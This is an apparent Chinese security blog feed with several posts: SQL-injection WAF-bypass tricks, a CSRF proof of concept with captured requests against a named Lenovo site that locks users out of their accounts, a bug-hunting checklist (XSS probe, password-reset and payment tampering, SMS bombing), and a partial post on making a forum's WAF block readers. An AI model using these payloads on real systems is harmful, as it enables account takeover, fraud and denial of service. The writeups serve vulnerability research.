创建了一个hello.php文件，他的代码是"></a>2 .  创建了一个<code>hello.php</code>文件，他的代码是</h5><pre><code>&lt;?phpvar_dump( $_GET );</code></pre><p>然后在浏览器打开<code>hello.html</code>页面，如下</p><p><img src="http://static.zybuluo.com/1kbfree/x8l0t2x4ezlvpi572pw5xtrh/image_1cljl4rrqkeq1m9n1f4j1eqqk4c3r.png" alt="image_1cljl4rrqkeq1m9n1f4j1eqqk4c3r.png-46.1kB"></p><p>然后点击查询</p><p><img src="http://static.zybuluo.com/1kbfree/2wxf81bnm79cxq6eh9thz3ky/image_1cljl6pt0bkfa6jibo1cpo1b5j65.png" alt="image_1cljl6pt0bkfa6jibo1cpo1b5j65.png-61.6kB"></p><p>可以看到链接成功带了<code>id=only_free</code>所以说用这个方式也可以传递参数的，学习了~</p><h4 id="7、编码绕过"><a href="#7、编码绕过" class="headerlink" title="7、编码绕过"></a>7、编码绕过</h4><p>利用编码绕过检测很容易理解的，就比如你在考试的时候你想作弊，但是你旁边有个人工智能机器人，检查到你说话中如果存在<code>答案</code>、<code>看下</code>、<code>第x题</code>等作弊相关的中文词的话就会警报，那么如果你改用英语，法语，手语的话就没办法检测出来，那么这个<code>waf</code>也是一样的，如果只判断了<code>union select</code>不能存在的话我们可以这样<code>Union Select</code>用大写的方式绕过，那么原文中的绕过方式是</p><p><img src="http://static.zybuluo.com/1kbfree/hvuxs95mri4mvb8h5p2df5n3/image_1cljlv4381hc4109t1cnr1bb88vd6i.png" alt="image_1cljlv4381hc4109t1cnr1bb88vd6i.png-67.5kB"></p><p>这里利用的是<code>Url</code>编码</p><p><img src="http://static.zybuluo.com/1kbfree/hhn4tnp8ejipx5ysehuoy0d9/image_1cljm1ruqgu096j15qeod5f466v.png" alt="image_1cljm1ruqgu096j15qeod5f466v.png-24kB"></p><p><img src="http://static.zybuluo.com/1kbfree/opsxwaha7zvlagt91athu4we/6.png" alt="6.png-16.6kB"></p><h4 id="8、利用Mysql数据库的一些特性，绕过WAF的防御规则"><a href="#8、利用Mysql数据库的一些特性，绕过WAF的防御规则" class="headerlink" title="8、利用Mysql数据库的一些特性，绕过WAF的防御规则"></a>8、利用Mysql数据库的一些特性，绕过WAF的防御规则</h4><p>如果<code>waf</code>过滤了<code>union select</code>以及大写小写的话我们可以用<code>Mysql</code>数据库的特性来绕过，首先打开我自己的<code>mysql</code>命令行来讲解</p><p><img src="http://static.zybuluo.com/1kbfree/pr0f6zwyoscqemek2hnerbpo/image_1cljmjibmh0aos41rbf1gbvpiiak.png" alt="image_1cljmjibmh0aos41rbf1gbvpiiak.png-13.8kB"></p><p>可以看到上图中我们输入了</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">123</span></code></pre><p>和</p><pre class=" language-sql"><code class="language-sql"><span class="token keyword">select</span><span class="token comment" spellcheck="true">/**/</span><span class="token number">123</span><span class="token comment" spellcheck="true">/*!*/</span><span class="token punctuation">;</span></code></pre><p>他们输出的结果一样，说明空格可以用<code>/**/</code>来代替</p><p><img src="http://static.zybuluo.com/1kbfree/ublmxdl97fyr1cbau58apasr/image_1cljmpankmilqs7va9br1116c1.png" alt="image_1cljmpankmilqs7va9br1116c1.png-44.1kB"></p><p>那么原文处的讲解肯定很容易看明白了吧~</p><h3 id="自动化Bypass"><a href="#自动化Bypass" class="headerlink" title="自动化Bypass"></a>自动化Bypass</h3><p>这个脚本就是根据<strong>%0a+内联注释为例</strong>，主要是针对</p><pre><code>union select from</code></pre><p>等关键字替换，Payload中的部分关键字可能会被waf拦截，需要一步步调试，测试，总结规律，因为代码不是看的非常懂，所以暂不讲解~</p>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕WAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>联想某处组合csrf</title>
      <link href="/2018/12/24/lian-xiang-mou-chu-zu-he-csrf/"/>
      <url>/2018/12/24/lian-xiang-mou-chu-zu-he-csrf/</url>
      
        <content type="html"><![CDATA[<p>1、打开Url：<code>http://www.enjoy3c.com/getMyInfo.do</code></p><p><img src="http://static.zybuluo.com/1kbfree/rekurvzdaq2vrs8riqg6p478/image_1cidsgkuu118n1see19cevvo1ugr9.png" alt="image_1cidsgkuu118n1see19cevvo1ugr9.png-80.5kB"></p><p>2、点击确定并且抓包，抓取的数据包如下</p><pre><code>POST /editMyInfo.do HTTP/1.1Host: www.enjoy3c.comContent-Length: 124Cache-Control: max-age=0Origin: http://www.enjoy3c.comUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://www.enjoy3c.com/getMyInfo.doAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: account=lalala&amp;loginMobile=13688888888&amp;loginEmail=1900065568%40qq.com&amp;realName=11&amp;identityCard=&amp;birthday=&amp;province=3&amp;city=36</code></pre><p>因为此处存在逻辑问题，可绕过验证绑定任意手机号码任意邮箱，并且在登陆的时候需要输入如下数据：</p><p><img src="http://static.zybuluo.com/1kbfree/6qb7lf2vv4s47ndyf5fvs4g0/image_1cidskcobm6lrbpe3esb214t1m.png" alt="image_1cidskcobm6lrbpe3esb214t1m.png-289.6kB"></p><p>所以我们只需要将<code>邮箱、手机号码、用户名</code>修改为用户不可能知道的数据，那么点击这个<code>csrf poc</code>的用户就没办法再次登陆此网站了。</p><p>so，将如上数据包中的<code>account</code>修改为<code>only_free_2018</code>，将<code>loginMobile</code>修改为<code>110</code>，将<code>loginEmail</code>修改为<a href="mailto:`admin@lenovo.com" target="_blank" rel="noopener">`admin@lenovo.com</a>`，修改后的数据包如下：</p><pre><code>POST /editMyInfo.do HTTP/1.1Host: www.enjoy3c.comContent-Length: 124Cache-Control: max-age=0Origin: http://www.enjoy3c.comUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://www.enjoy3c.com/getMyInfo.doAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: Connection: closeaccount=only_free_2018&amp;loginMobile=110&amp;loginEmail=admin@lenovo.com&amp;realName=11&amp;identityCard=&amp;birthday=&amp;province=3&amp;city=36</code></pre><p>3、将其构造为<code>csrf poc</code></p><pre><code>&lt;html&gt;  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;  &lt;body&gt;  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;    &lt;form action=&quot;http://www.enjoy3c.com/editMyInfo.do&quot; method=&quot;POST&quot;&gt;      &lt;input type=&quot;hidden&quot; name=&quot;account&quot; value=&quot;only&amp;#95;free&amp;#95;2018&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;loginMobile&quot; value=&quot;110&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;loginEmail&quot; value=&quot;admin&amp;#64;lenovo&amp;#46;com&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;realName&quot; value=&quot;11&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;identityCard&quot; value=&quot;&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;birthday&quot; value=&quot;&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;province&quot; value=&quot;3&quot; /&gt;      &lt;input type=&quot;hidden&quot; name=&quot;city&quot; value=&quot;36&quot; /&gt;      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;    &lt;/form&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>4、在浏览器处打开此poc：</p><p><img src="http://static.zybuluo.com/1kbfree/d0avtrk11i2ce9fsztk5c0lg/image_1cidstmth174t1e1qtjg1dmehs71j.png" alt="image_1cidstmth174t1e1qtjg1dmehs71j.png-24.4kB"></p><p><img src="http://static.zybuluo.com/1kbfree/z7lm3p2pi03regpyfb1y7k3m/image_1cidstumjjc7ts7mql1oul10ok20.png" alt="image_1cidstumjjc7ts7mql1oul10ok20.png-23.8kB"></p><p><img src="http://static.zybuluo.com/1kbfree/cm1s0m28atunru992vil55i6/image_1cidsuenigbfvml5fkidtopv2d.png" alt="image_1cidsuenigbfvml5fkidtopv2d.png-99.3kB"></p><p>成功被修改，那么这个时候，就没办法再登陆此网站了，因为登陆凭据被我修改了，比修改密码还要狠，修改密码后还可以用手机号码或者邮箱找回，而这个连密码都没办法找回，并且还不知道手机号码和邮箱和用户名是多少~~</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞案例 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞挖掘思路小总结【持续更新】</title>
      <link href="/2018/12/24/lou-dong-wa-jue-si-lu-xiao-zong-jie/"/>
      <url>/2018/12/24/lou-dong-wa-jue-si-lu-xiao-zong-jie/</url>
      
        <content type="html"><![CDATA[<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>1、首先，比如在调用图片处，调用远程文件（修改为要访问的URL）处，或者一些IP查询的，如图</p><p><img src="http://static.zybuluo.com/1kbfree/pah66v9b293kuy2gz5xu77g4/image_1chnh3u3kvsmc6710kr1l3i1nqn19.png" alt="image_1chnh3u3kvsmc6710kr1l3i1nqn19.png-102.3kB"></p><p>上图就是百度某站点去请求输入框里面的内容，也就是<code>bbs.ixsec.org/baidu.php</code>，然后服务端就会去请求这个URL，并且将数据返回到输出的地方。</p><p>2、比如当存在ssrf处没有过滤的话，是可以探测内网的，比如<code>127.0.0.1</code>等。</p><p>3、还能探测IP地址等。</p><h4 id="防御方法："><a href="#防御方法：" class="headerlink" title="防御方法："></a>防御方法：</h4><p>1、白名单方法：设置只允许请求xxx网址。</p><h3 id="Csrf"><a href="#Csrf" class="headerlink" title="Csrf"></a>Csrf</h3><p>Csrf多处存在于 修改 增加 删除 等操作中都可以尝试使用跨站请求伪造。</p><h3 id="Xss"><a href="#Xss" class="headerlink" title="Xss"></a>Xss</h3><p>1、搜索框里输入<code>&lt;img src=x onerror=alert(1)&gt;</code>，查看是否能弹窗。</p><p>2、比如某个页面评论处插入了<code>&lt;img src=x&gt;</code>被实体编码的话，假设当前的网站有一个引用功能，那么我们就可以引用一下这个评论，如果在引用页面没有实体化编码的话，那么就会存在二次Xss漏洞攻击。</p><p>3、比如某些网站在评论后会显示 IP 或者 来源（电脑、手机、苹果之类的），如果是可控的话我们可以修改为恶意的<code>JS</code>代码，因为很少开发者会把这些地方选择实体化编码。</p><p>4、总结就是有框就插，没实体输出的话就干，没实体输出的话就选择去绕过~</p><h3 id="Sql注入"><a href="#Sql注入" class="headerlink" title="Sql注入"></a>Sql注入</h3><p>我也不太会，不写了</p><h3 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h3><p>1、普遍创建<code>2</code>个账号，然后将 2 个账号中统一操作的数据包复制下来，慢慢的进行分析，查看是否有身份标识是可控的。</p><p>2、某些网站的ID是非常的长的，但是如果是有规则的话还是可以分析出来的，如下案例：</p><p>iamfree账号的ID：</p><pre><code>2018666iamfreeabcbcaabcbca66612</code></pre><p>hack账户的ID：</p><pre><code>2018666hackabcbcaabcbca66676</code></pre><p>提取下来分析，这个案例很简单，有眼睛都看得出来只有中间的和最后面的不同，而中间不同处是用户的名称，而后面二位不同的话是可以爆破的，毕竟才二位。</p><h3 id="任意用户操作（如注册，重置等）"><a href="#任意用户操作（如注册，重置等）" class="headerlink" title="任意用户操作（如注册，重置等）"></a>任意用户操作（如注册，重置等）</h3><blockquote><p>此漏洞一般都是处于<strong>忘记密码处和注册处</strong></p></blockquote><h4 id="手机号码找回"><a href="#手机号码找回" class="headerlink" title="手机号码找回"></a>手机号码找回</h4><ol><li><p>输入520xxx后网站会对520xxx发送一条验证码，此时可以查看一下数据包中或者返回的数据包中是否存在此验证码，</p></li><li><p>输入正确的手机号码和验证码，然后抓包查看返回值，然后替换到想任意重置的用户的数据返回包中，查看是否能够成功的绕过从而重置密码</p></li><li><p>如果验证码是4位的，且有效时间过长是可以选择爆破的。</p></li><li><p>自己加入一下数据，假设<a href="http://www.a.com在修改用户数据的时候会传递一个值（user_name），然后我们在忘记密码处输入正确的手机号码和验证码，并且再重置成功的最后一步参数添加user_name=admin，如果这里是有接受user_name的值的话并且处理的话，你就可以重置admin用户的账号密码了。" target="_blank" rel="noopener">www.a.com在修改用户数据的时候会传递一个值（user_name），然后我们在忘记密码处输入正确的手机号码和验证码，并且再重置成功的最后一步参数添加user_name=admin，如果这里是有接受user_name的值的话并且处理的话，你就可以重置admin用户的账号密码了。</a></p></li><li><p>查看每一步操作，比如<strong>第一步</strong>是验证手机号码是否正确，<strong>第二步</strong>是填写新密码，那么我们在<strong>第一步</strong>输入正确的手机号码（<code>1511...</code>）-&gt;点击获取验证码-&gt;输入正确的验证码，然后到达<strong>第二步</strong>的时候填写新的密码然后抓包（放到<code>Repeater</code>模块里）。然后我们再回到第一步，输入<code>17520...</code>的手机号码-&gt;点击获取验证码（不用输入验证码，因为你也获取不到其他用户的验证码），然后我们在<code>Repeater</code>模块中点击<code>1511...</code>用户输入新密码的那个数据包的<code>GO</code>，如果可以重置就表示没有判断第一步就可以执行第二步了，但是这里有一点是注意的，如果手机号码和验证码存在第二步中，那么这个方法就不会有效。</p></li><li><p>见过最多的是找回密码的token是base64编码的，而解码后的明文根据其规则修改就可以成为别人用户找回密码的凭证了。</p></li></ol><h4 id="邮箱账号找回"><a href="#邮箱账号找回" class="headerlink" title="邮箱账号找回"></a>邮箱账号找回</h4><ol><li><p>HOST头伪造：输入正确的邮箱账号，但是修改 HOST（也就是发送的域名） ，比如修改为<code>www.iamfree.com</code>（如果这里没有过滤的话，邮箱里发送的内容就会是<a href="http://www.iamfree.com/xxx重置密码链接xxx），然后`www.iamfree.com`的功能就是存储每个请求，那么我们就可以获取到重置密码的请求，从而来重置用户的账号" target="_blank" rel="noopener">www.iamfree.com/xxx重置密码链接xxx），然后`www.iamfree.com`的功能就是存储每个请求，那么我们就可以获取到重置密码的请求，从而来重置用户的账号</a></p></li><li><p>设计不当，如图:<br> <img src="http://static.zybuluo.com/1kbfree/2c6l0py7anivgdidm1c25owk/QQ%E5%9B%BE%E7%89%8720180711111343.png" alt="QQ图片20180711111343.png-133.5kB"></p><p> <em>同时这里还可邮箱轰炸，不断的点击修改密码，那么网站就会一直发送邮箱给修改的用户</em></p></li><li><p>其余同手机号码找回漏洞原理差不多。</p></li></ol><h4 id="重置他人密码"><a href="#重置他人密码" class="headerlink" title="重置他人密码"></a>重置他人密码</h4><p><img src="http://static.zybuluo.com/1kbfree/buwt3bresnlpdvu152xsuv3k/image_1ci3lgscf15gd123rs1118171o09dh.png" alt="image_1ci3lgscf15gd123rs1118171o09dh.png-69.7kB"></p><h4 id="注册用户处"><a href="#注册用户处" class="headerlink" title="注册用户处"></a>注册用户处</h4><ol><li>这里的话也和手机找回密码处逻辑差不多，但是不同的是任意用户注册的话手机号码是存在的，而任意用户注册的话是手机号码不存在，并且可以不用输入正确的手机号码验证码就可绕过。</li></ol><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>没挖过</p><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><p>没挖过</p><h3 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过"></a>验证码绕过</h3><h4 id="图形类验证码绕过"><a href="#图形类验证码绕过" class="headerlink" title="图形类验证码绕过"></a>图形类验证码绕过</h4><ol><li><p>验证码刷新之后，而历史刷新的验证码还是可以继续使用。</p></li><li><p>验证码使用过后不刷新，时效性不过期，可以一直复用。</p></li><li><p>很多验证码的显示很简单，容易被机器识别。</p></li></ol><h4 id="短信类验证码绕过"><a href="#短信类验证码绕过" class="headerlink" title="短信类验证码绕过"></a>短信类验证码绕过</h4><ol><li><p><strong>验证码过于简易&amp;接口未限制</strong>：有些手机短信验证码都为 4-8位 纯数字的验证码，在接口没有任何限制的情况下是可以直接爆破的</p></li><li><p><strong>验证码发送复用&amp;时效性过长&amp;接口未限制</strong>：位数验证码时效性为5分钟，但是在这里同一手机号发送的验证码都是一样的，所以可以在4分钟的时候重新发送一次验证码这样验证码就又有效了，因为验证码一直在被复用，所以可以爆破。</p></li><li><p><strong>万能验证码</strong>：这是很多大企业的诟病，在未上线前为了方便测试加了<code>888888</code>、<code>000000</code>这样的万能验证码但是上线后没去删除测试的3内容导致被恶意利用。</p></li><li><p>验证码有回显，如图：<br> <img src="http://static.zybuluo.com/1kbfree/pkphqx4gbjtgff9wufh5zzh6/image_1ci3kbdbf47i19m661bkis14hd9.png" alt="image_1ci3kbdbf47i19m661bkis14hd9.png-181.1kB"></p></li><li><p>各种可逆<br> <img src="http://static.zybuluo.com/1kbfree/6b1e508ho3oxitluwmsarl2t/image_1ci3kh3ah1mk2v9vhpf14l71gan36.png" alt="image_1ci3kh3ah1mk2v9vhpf14l71gan36.png-143.9kB"></p><p> <img src="http://static.zybuluo.com/1kbfree/anl52kj3h3bweipc37v9bwe1/image_1ci3kkd4l190h141t6u7109g1s5i5j.png" alt="image_1ci3kkd4l190h141t6u7109g1s5i5j.png-105.5kB"></p></li><li><p>逻辑顺序</p></li></ol><h3 id="短信-语音验证码重放"><a href="#短信-语音验证码重放" class="headerlink" title="短信/语音验证码重放"></a>短信/语音验证码重放</h3><blockquote><p>无论是发送短信还是语音验证码来做验证，都是需要手机号的，而发送验证码实际上是需要成本的，需要跟运营商或者是第三方验证码平台进行合作，多数验证码为0.01元一条，当然也有更便宜的，所以这边的问题也会影响到一个企业的资产方面。</p></blockquote><ol><li><p>厂商对验证码发送这一块并没有进行限制时间发送，可造成短信轰炸</p></li><li><p>很多厂商会对手机号进行限制，如果60秒内发送过就不会发送，但是程序员在设计代码层的逻辑时会出现很多奇葩的问题，例如其为了方便用户体验，正常的代码层的流程为：去除用户手误输入的空格以及一些特殊符号 -&gt; 验证手机号是否发送过验证码。</p><p> 某些程序员会这样设计流程： 验证手机号是否发送过验证码（发送过则不放行 没发送过则进入下一步） -&gt; 去除用户手误输入的空格以及一些特殊符号 -&gt; 发送手机号验证码</p><p> <img src="http://static.zybuluo.com/1kbfree/9681mrzwscihzf00jd1w9cas/image_1ci3l05h35stck719k01nqj6v59q.png" alt="image_1ci3l05h35stck719k01nqj6v59q.png-192.5kB"></p></li><li><p><strong>手机号可遍历发送</strong>：验证码发送会影响到企业资产，那么发送验证码限制就不能仅仅针对于单一手机号的限制，例如我可以载入一堆手机号的字典，然后直接遍历发送验证码，这也是危害之一。</p></li></ol><h3 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h3><ol><li><p>查看是否是<code>IIS6.0</code>等搭建的，因为如果是这些服务器搭建的话我们是可以通过解析漏洞或者00截断来上传我们想要上传的文件</p></li><li><p>如果只是前端判断上传的文件后缀名的话，我们可以用<code>Burp</code>来绕过</p></li><li><p>如果是只判断了HTTP/HTTPS的请求包中的<code>Content-type</code>我们就只需要修改为合法的就可以上传了。</p></li><li><p>更多（待续）</p></li></ol><h3 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h3><p>比如一个后台，是需要正确的管理员密码才能登陆（废话），那么未授权访问就是说不需要用户名和密码即可登陆后台。</p><ol><li>比如你输入账号密码后服务端会判断账号密码是否正确，如果登陆成功，照常访问，如果登陆失败的话就会用前段的跳转强制让你回到首页，那么我们可以抓包的时候修改返回值，如果返回值是html代码的话，找到跳转的链接，将其删除，如果是状态码这些，将类似的<code>Error</code>修改为<code>Success</code>，总之看情况的。</li></ol><h3 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h3><blockquote><p>基本上大站是不存在这个漏洞的，除非个把程序员想要去祭天</p></blockquote><ol><li><p>比如购买iamfree这个产品的时候，需要99999999999元，那么我们在点击购买的时候，尝试修改99999999999元为1元后放包，查看是否能购买成功</p></li><li><p>比如在购买iamfree的时候，都会弹出一个是否购买成功然后选项是购买成功，另一个选项是购买失败，那么我们什么都不要点击，因为这样子的肯定是有空多长时间重新请求的，我们就可以打开代理，并且开启抓包模式，等又发起请求的时候，我们可以修改请求包中的返回值为正确购买的（多修改试试）</p></li><li><p>如果商品的价格是不能改的话我们可以试试这个思路：一般购买商品的话是存在优惠券的，比如我购买iamfree的时候需要200元，而优惠券就是满200优惠10元的，那么可以-&gt;选择这个优惠卷-&gt;抓包，查看数据包里是否有可以的参数的值为10为199，那么这个时候如果没有验证优惠券的价格的话就会变成1元钱（200-199=1，我只是为了声明，并没有怀疑你们的智商= ~~ =）就可以购买了。</p></li><li><p>如果以上都不成功的话还是别放弃，查看一下网站是否存在退款功能，比如我购买了10元的产品，那么还没发货的时候我们可以点击退款，但是退款中，数据包中包含那个10，那么我们可以尝试一下把10修改为1000，然后查看一下自己的钱是否有变多~</p></li><li><p>还是退款功能，我们抓取数据包后，放到<code>Repeater</code>模块中，一直点GO，虽然我也不知道原理，但是记得有看文章看到过，反正如果添加了你的余额就可以了。</p></li><li><p>修改商品数量</p></li><li><p><strong>sign值可逆：</strong> sign多数为对比确认金额的一段内容，很多都是md5加密的，这时候你要做好自己的分析明文到底是什么，然后去碰撞，例如可能是md5(订单号+金额)这样的的组合，然后修改金额重新生成sign就可以绕过金额固定的限制了。</p></li></ol><h3 id="通用操作绕过"><a href="#通用操作绕过" class="headerlink" title="通用操作绕过"></a>通用操作绕过</h3><ol><li><p>假设某个步骤1的<code>URL</code>为<code>http://www.iamfree.com/do1</code>，这时候可以尝试修改下链接为<code>/do2</code>等类似的<code>URL</code>的来测试是否能绕过第一步来进行第二步的操作。</p><p> <img src="http://static.zybuluo.com/1kbfree/edxojnlxcdjd9c4jsvimkr14/image_1ci3l1b511s8p1ffcpdsko81ubca7.png" alt="image_1ci3l1b511s8p1ffcpdsko81ubca7.png-104.2kB"></p></li></ol><h3 id="条件竞争-HTTP并发"><a href="#条件竞争-HTTP并发" class="headerlink" title="条件竞争(HTTP并发)"></a>条件竞争(HTTP并发)</h3><ol><li>在签到、转账、兑换、购买等场景是最容易出现这样的问题。比如当你点击签到的时候，抓包，然后放到<code>Repeater</code>模块里，一直点击<code>GO</code>，如果程序员没有做严格的过滤的话，我们点击的<code>签到、转账、兑换、购买</code>的次数会随着<code>GO</code>的次数增加，而且不会消耗另外的东西。</li></ol><h3 id="任意URL跳转漏洞"><a href="#任意URL跳转漏洞" class="headerlink" title="任意URL跳转漏洞"></a>任意URL跳转漏洞</h3><p>这里以途牛为例（马赛克走起）</p><p><img src="http://static.zybuluo.com/1kbfree/82etcgp78wa9cxddl2507sck/image_1ci1jsh76han1cbvm0jenvaud19.png" alt="image_1ci1jsh76han1cbvm0jenvaud19.png-86.2kB"></p><p>他这里的<code>murl</code>就是跳转到哪儿的链接，但是被限制了（目测是正则，但是正则这东西很容易绕过的，不相信继续看下去）</p><p><img src="http://static.zybuluo.com/1kbfree/m3qaf7ts388spf33tebasl4u/image_1ci1k65ij1qvf7br13e3gv6duk26.png" alt="image_1ci1k65ij1qvf7br13e3gv6duk26.png-129.1kB"></p><p>我们输入一下<code>https://www.我们的url.com/?www.途牛url.com</code></p><p><img src="http://static.zybuluo.com/1kbfree/53dzezrpirj31mfuvmq5091s/image_1ci1k923m12evj45p8j1ut4mlk2j.png" alt="image_1ci1k923m12evj45p8j1ut4mlk2j.png-103.3kB"></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞思路 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个有趣的思路</title>
      <link href="/2018/12/24/yi-ge-you-qu-de-si-lu/"/>
      <url>/2018/12/24/yi-ge-you-qu-de-si-lu/</url>
      
        <content type="html"><![CDATA[<p>首先，正常打开I春秋页面（<code>https://bbs.ichunqiu.com/portal.php</code>）</p><p><img src="http://static.zybuluo.com/1kbfree/nwi21qubl7d9nfk5bsgcmo9n/image_1co8pc6j2lsosoc5deimp119l9.png" alt="image_1co8pc6j2lsosoc5deimp119l9.png-488kB"></p><p>然后手贱一下加上一个<code>alert(1)</code>试试~（<code>https://bbs.ichunqiu.com/portal.php?a=alert(1)</code>）</p><p><img src="http://static.zybuluo.com/1kbfree/6btvax83xx7vsc6lwf4wpbnc/image_1co8pe8r41j8u13va2nqeo4tlsm.png" alt="image_1co8pe8r41j8u13va2nqeo4tlsm.png-80kB"></p><h3 id="尝试利用"><a href="#尝试利用" class="headerlink" title="尝试利用"></a>尝试利用</h3><p>我去=v=。这个<code>WAF</code>（加速乐）很强，这都给拦了，但是作为一个捡漏洞的人来讲，要别人交互的漏洞都是低位和不收的，而且这个是要用户打开链接才可以被拦截，但是等下就会正常显示，那用户点击后发现会显示这个页面不可能再次点击把~，那么就应该想想如何提升危害，然后我发现了有个好玩的~</p><h3 id="构造代码"><a href="#构造代码" class="headerlink" title="构造代码"></a>构造代码</h3><p>首先我在本地尝试一下，创建一个<code>HTML</code>文件，代码是</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>拦截吧（你打不开i春秋了）<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://bbs.ichunqiu.com/portal.php?a<span class="token punctuation">=</span>alert(1)<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>然后在浏览器处打开</p><p><img src="http://static.zybuluo.com/1kbfree/o1esq9tp010wd1h1lcfg5djd/image_1co8pnjs3hpu61e2qu178avuq13.png" alt="image_1co8pnjs3hpu61e2qu178avuq13.png-13.8kB"></p><p>然后再尝试打开<code>I春秋</code></p><p><img src="http://static.zybuluo.com/1kbfree/jm5cdg98scgmuh8bruh46a1k/image_1co8ppa5ldmeg3r1b2ria5128h1g.png" alt="image_1co8ppa5ldmeg3r1b2ria5128h1g.png-74.1kB"></p><p>我来解释一下为啥子~因为<code>img</code>标签设置的<code>src</code>属性是<code>https://bbs.ichunqiu.com/portal.php?a=alert(1)</code>，所以打开页面会加载<code>https://bbs.ichunqiu.com/portal.php?a=alert(1)</code>这个<code>URL</code>，然后我们访问这个<code>URL</code>的话会被<code>WAF</code>拦截，导致无法访问<code>I春秋</code></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>我们可以看到<code>I春秋</code>回复处可以加载图片，如下（随便打开一个文章：<code>https://bbs.ichunqiu.com/thread-46084-1-1.html</code>）</p><p><img src="http://static.zybuluo.com/1kbfree/eje7n4yxnwov6cp5zmiuqoif/image_1co8rbua7oeq4qj6kmte5vvm6r.png" alt="image_1co8rbua7oeq4qj6kmte5vvm6r.png-111.5kB"></p><p><img src="http://static.zybuluo.com/1kbfree/nk77x8b6bu3olh7vd7o2ecx1/image_1co8rd4ln1s3uj5ubud1st01gij78.png" alt="image_1co8rd4ln1s3uj5ubud1st01gij78.png-149.4kB"></p><p>上传的图片是：<code>https://bbs.ichunqiu.com/uc_server/avatar.php?uid=340720&amp;size=middle</code></p><p>那么我想让别人访问这个文章就显示<code>WAF</code>拦截页面如何搞？ 嘿嘿，可以在链接后面加个<code>&amp;a=alert(1)</code>，变成<code>https://bbs.ichunqiu.com/uc_server/avatar.php?uid=340720&amp;size=middle&amp;a=alert(1)</code></p><blockquote><p>注意：先发一条评论然后点击编辑然后插入这段代码</p></blockquote><pre><code>[img=120,120]https://bbs.ichunqiu.com/uc_server/avatar.php?uid=340720&amp;size=middle&amp;a=alert(1)[/img]</code></pre><p>如下</p><p><img src="http://static.zybuluo.com/1kbfree/6sq9x8f4w6ntntvxjxqztqvz/image_1co8rja781h0o9q282f11lva7l82.png" alt="image_1co8rja781h0o9q282f11lva7l82.png-103.1kB"></p><p>然后再次访问 